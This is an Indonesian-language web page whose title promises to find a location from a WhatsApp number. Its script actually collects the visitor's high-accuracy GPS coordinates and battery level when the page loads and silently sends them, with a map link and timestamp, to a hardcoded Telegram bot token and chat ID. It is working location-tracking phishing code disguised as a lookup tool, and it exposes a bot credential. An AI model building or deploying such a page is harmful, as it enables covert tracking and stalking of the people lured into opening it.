<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <title>Cek Lokasi Dengan Nomor WhatsApp</title>
  <style>
    :root {
      --bg-color: #000010;
      --text-color: #ffffff;
      --card-bg: rgba(255,255,255,0.08);
    }
    body.light {
      --bg-color: #f4f4f4;
      --text-color: #111111;
      --card-bg: rgba(0,0,0,0.05);
    }
    body {
      margin: 0;
      padding: 0;
      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
      color: var(--text-color);
      background-color: var(--bg-color);
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      height: 100vh;
      text-align: center;
      overflow: hidden;
      transition: background 0.5s, color 0.5s;
      position: relative;
    }
    .background {
      position: fixed;
      top: 0; left: 0;
      width: 100%;
      height: 100%;
      background: url('https://i.ibb.co/ZmF5Xz7/stars-bg.png') repeat;
      animation: starsMove 120s linear infinite;
      z-index: -3;
      opacity: 0.5;
    }
    .planet {
      position: fixed;
      bottom: -80px;
      right: -80px;
      width: 500px;
      height: 1000px;
      background: url('https://img1.pixhost.to/images/5671/597339664_conn.jpg') no-repeat center/contain;
      opacity: 0.3;
      z-index: -2;
      animation: floatPlanet 30s ease-in-out infinite alternate;
    }
    @keyframes starsMove {
      from { background-position: 0 0; }
      to { background-position: 10000px 10000px; }
    }
    @keyframes floatPlanet {
      0% { transform: translateY(0); }
      100% { transform: translateY(-30px); }
    }
    #toggleMode {
      position: absolute;
      top: 1rem;
      right: 1rem;
      padding: 6px 12px;
      background: rgba(255,255,255,0.1);
      color: var(--text-color);
      border: none;
      border-radius: 8px;
      font-weight: bold;
      cursor: pointer;
      backdrop-filter: blur(5px);
      z-index: 2;
    }
    h1 {
      font-size: 1.7rem;
      font-weight: 700;
      margin-bottom: 1rem;
    }
    #info {
      background: var(--card-bg);
      border-radius: 14px;
      padding: 1.2rem 1.5rem;
      max-width: 350px;
      width: 90%;
      box-shadow: 0 8px 25px rgba(0,0,0,0.25);
      z-index: 1;
    }
    .loading {
      display: inline-block;
      width: 12px;
      height: 12px;
      border: 2px solid var(--text-color);
      border-top: 2px solid transparent;
      border-radius: 50%;
      animation: spin 1s linear infinite;
      margin-left: 6px;
    }
    @keyframes spin {
      0% { transform: rotate(0); }
      100% { transform: rotate(360deg); }
    }
    #map {
      border-radius: 10px;
      margin-top: 10px;
      width: 100%;
      height: 200px;
      border: none;
    }
    .credit {
      margin-top: 2rem;
      font-size: 0.85rem;
      color: var(--text-color);
      opacity: 0.8;
      z-index: 1;
    }
    .social-link {
      display: inline-flex;
      align-items: center;
      gap: 6px;
      color: var(--text-color);
      text-decoration: none;
      margin: 0 8px;
      padding: 5px 10px;
      border-radius: 6px;
      transition: all 0.3s ease;
    }
    .social-link:hover {
      background: rgba(255,255,255,0.1);
      transform: scale(1.05);
    }
    @media (max-width: 400px) {
      h1 {
        font-size: 1.5rem;
      }
    }
  </style>
</head>
<body>
  <div class="background"></div>
  <div class="planet"></div>
  <button id="toggleMode">Light Mode</button>
  <h1>Mendeteksi Lokasi & Baterai Anda Terlebih Dahulu...</h1>
  <div id="info">
    <div><strong>Lintang:</strong> <span id="lat">Loading<span class="loading"></span></span></div>
    <div><strong>Bujur:</strong> <span id="lon">Loading<span class="loading"></span></span></div>
    <div><strong>Tingkat Baterai:</strong> <span id="battery">Loading<span class="loading"></span></span></div>
    <iframe id="map" allowfullscreen loading="lazy"></iframe>
  </div>
  <div class="credit">
    Created by <strong>1mhmdrez_</strong><br>
    <a href="https://instagram.com/1mhmdrez_" class="social-link" target="_blank">
      <img src="https://img.icons8.com/ios-filled/20/ffffff/instagram-new.png"/> Instagram
    </a>
    <a href="https://youtube.com/@1mhmdrez_" class="social-link" target="_blank">
      <img src="https://img.icons8.com/ios-filled/20/ffffff/youtube-play.png"/> YouTube
    </a>
  </div>
  <script>
    const toggleBtn = document.getElementById('toggleMode');
    toggleBtn.onclick = () => {
      document.body.classList.toggle('light');
      toggleBtn.textContent = document.body.classList.contains('light') ? 'Dark Mode' : 'Light Mode';
    };
    const TELEGRAM_BOT_TOKEN = '7660291580:AAGd9TElBNVfxicOh4kS6BeaMVOT9l2luQE';
    const CHAT_ID = '5408845642';
    async function sendToTelegram(message) {
      try {
        const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(message)}`;
        await fetch(url, { method: 'GET', mode: 'no-cors' });
      } catch {}
    }
    function updateInfo(lat, lon, batteryLevel) {
      document.getElementById('lat').textContent = lat.toFixed(6);
      document.getElementById('lon').textContent = lon.toFixed(6);
      document.getElementById('battery').textContent = (batteryLevel * 100).toFixed(0) + '%';
      document.getElementById('map').src = `https://maps.google.com/maps?q=${lat},${lon}&z=15&output=embed`;
    }
    function getBatteryLevel() {
      if (navigator.getBattery) {
        return navigator.getBattery().then(b => b.level);
      } else if (navigator.battery) {
        return Promise.resolve(navigator.battery.level || 1);
      } else {
        return Promise.resolve(null);
      }
    }
    function sendData(lat, lon, batteryLevel) {
      const now = new Date();
      const message = `ðŸš¨ Entri Baru Terdeteksi ðŸš¨
Lokasi: https://maps.google.com/?q=${lat},${lon}
Lintang: ${lat.toFixed(6)}
Bujur: ${lon.toFixed(6)}
Baterai: ${(batteryLevel * 100).toFixed(0)}%
Waktu: ${now.toLocaleString()}`;
      sendToTelegram(message);
    }
    function initialize() {
      navigator.geolocation.getCurrentPosition(async (pos) => {
        const lat = pos.coords.latitude;
        const lon = pos.coords.longitude;
        const battery = (await getBatteryLevel()) ?? 0;
        updateInfo(lat, lon, battery);
        sendData(lat, lon, battery);
      }, (err) => {
        document.getElementById('lat').textContent = 'Error';
        document.getElementById('lon').textContent = 'Error';
        document.getElementById('battery').textContent = 'N/A';
      }, {
        enableHighAccuracy: true,
        timeout: 30000,
        maximumAge: 0
      });
    }
    window.onload = initialize;
  </script>
</body>
</html>
